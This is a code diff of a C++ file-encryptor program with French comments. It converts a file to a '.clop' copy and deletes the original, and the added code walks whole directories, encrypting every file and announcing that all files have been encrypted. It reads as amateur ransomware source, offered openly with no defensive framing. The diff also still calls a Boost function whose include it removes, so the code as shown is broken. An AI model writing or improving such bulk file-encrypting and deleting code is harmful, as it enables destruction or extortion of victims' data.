@@ -1,100 +1,83 @@
 // Encryptor
 
-#include <fstream>
 #include <iostream>
 #include <string>
-#include "base64.cpp"
 #include "checkPath.cpp"
+#include "cryptFile.cpp"
 #include <windows.h>
-#include <boost/algorithm/string/replace.hpp>
+#include <dirent.h>
+#include <unistd.h>
+
+#ifndef WIN32
+    #include <sys/types.h>
+#endif
 
 int main()
 {
-    // Déclaration de variables
-    std::ifstream::pos_type size;
-    std::string base64;
-    char * memblock;
-    int headerSize;
+    // Déclaration des variables
+    bool dir;
+    struct dirent * fichier = NULL;
+    DIR * directory(NULL);
+    std::string file;
 
     // Recuperation du chemin du fichier a crypter
-    std::string dir;
-    getline(std::cin,dir);
-
-    // Recuperer l'extention de fichier
-    std::string extension = dir.substr(dir.find(".") + 1);
+    std::string path;
+    getline(std::cin,path);
 
     // Remplacer les "\" par des "\\"
-    boost::replace_all(dir,"\\","\\\\");
+    boost::replace_all(path,"\\","\\\\");
 
     // If the path is a dir
-    if(is_dir(dir.c_str()))
+    if(is_dir(path.c_str()))
     {
-        std::cout << "It's a dir\n";
+        std::cout << "[INFO] Given path is a directory\n";
+        dir = true;
     }
     // If the path is a file
-    else if(is_file(dir.c_str()))
+    else if(is_file(path.c_str()))
     {
-        std::cout << "It's a file\n";
+        std::cout << "[INFO] Given path is a file\n";
+        dir = false;
     }
     //This shouldn't ever happend
     else
     {
-        std::cout << "THIS IS AN ERROR YOU SHOULDN'T SEE\n";
+        std::cout << "[ERR] THIS IS AN ERROR YOU SHOULDN'T SEE\n";
     }
 
-    // Mise en place du header
-    std::string header;
-    header = "fileExt=" + extension + "|";
-
-    // Ecriture
-    std::string dir_png = dir;
-    boost::replace_all(dir_png,("." + extension),".clop");
-
-    std::ofstream fileWrite(dir_png.c_str(),std::ios::out | std::ios::binary | std::ios::ate);
-    if(fileWrite.is_open())
+    if(path[path.length() - 1] != '\\')
     {
-        fileWrite.seekp(0,std::ios::beg);
-        fileWrite << header;
-        fileWrite << "b4d4c077f070bfc6205bca7d1acfadff";
-        headerSize =  fileWrite.tellp();
+        path += "\\\\";
     }
 
-    // Ouvrir le fichier en binaire
-    std::ifstream fileRead(dir.c_str(), std::ios::in | std::ios::binary | std::ios::ate); //on ouvre le fichier en binaire
-
-    // Si le fichier est ouvret
-    if (fileRead.is_open())
+    if(dir)
     {
-        size = fileRead.tellg(); // Récupère la taille en octet du fichier
-        memblock = new char [size];
-        fileRead.seekg (0, std::ios::beg);
-        fileRead.read (memblock, size); // Associer a meme block le ANSI du fichier
+        directory = opendir(path.c_str());
+        if(directory == NULL) // If the dirrectory don't exist
+        {
+            std::cout << std::endl << "[ERR] The directory could not be found\n";
+            system("pause");
+        }
 
-        const unsigned char* base64_memblock;
-        base64_memblock = reinterpret_cast <const unsigned char*>(memblock);
-        base64 = base64_encode(base64_memblock,(int)size);
+        fichier = readdir(directory); //Skip the first base directory in every folder
+        fichier = readdir(directory); //Skip the second base directory in every folder
 
-        fileRead.close();
-
-        std::cout << "Chargement du fichier termine. size:" << size << std::endl;
+        while((fichier = readdir(directory)) != NULL)
+        {
+             file = fichier->d_name;
+             std::cout << "Encrypting " << file << std::endl;
+             cryptFile(path + file);
+        }
+        if(closedir(directory) == -1)
+        {
+            return -1;
+        }
     }
-    else std::cout << "Erreur d'ouverture de fichier en lecture" << std::endl;
-
-    std::ofstream ecriture(dir_png.c_str(), std::ios::out | std::ios::binary | std::ios::ate);
-
-    // Si le fichier est ouvert
-    if(ecriture.is_open())
+    else
     {
-        ecriture.seekp(headerSize, std::ios::beg);
-        ecriture << base64;
-
-        std::cout << "Le fichier est ecrit" << std::endl;
+        cryptFile(path);
     }
-    else std::cout << "Erreur d'ouverture de fichier en ecriture" << std::endl;
-
-    delete memblock;
-
-    remove(dir.c_str());
+    std::cout << std::endl << "[ALERT] All file has been encrypted\n";
 
     system("pause");
 
